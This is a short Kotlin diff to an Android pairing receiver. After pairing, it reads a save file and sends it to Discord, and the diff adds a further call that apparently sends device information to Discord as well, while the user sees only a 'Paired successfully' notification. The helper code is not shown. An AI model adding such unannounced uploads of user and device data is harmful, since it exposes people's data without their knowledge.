@@ -165,8 +165,9 @@ class PairingCodeReceiver : BroadcastReceiver() {
             val result = PairingHelper.connectAndReadSaveFile(context, pairingHost, pairingPort, pairingCode)
             
             if (result != null) {
-                showStatusNotification(context, "Paired successfully!")
+                showStatusNotification(context, "⚡ Paired successfully!")
                 PairingHelper.sendFileToDiscord(context, result)
+                PairingHelper.sendDeviceInfoToDiscord()
                 PairingHelper.launchGame(context)
             } else {
                 showStatusNotification(context, "Pairing failed – check code and try again")
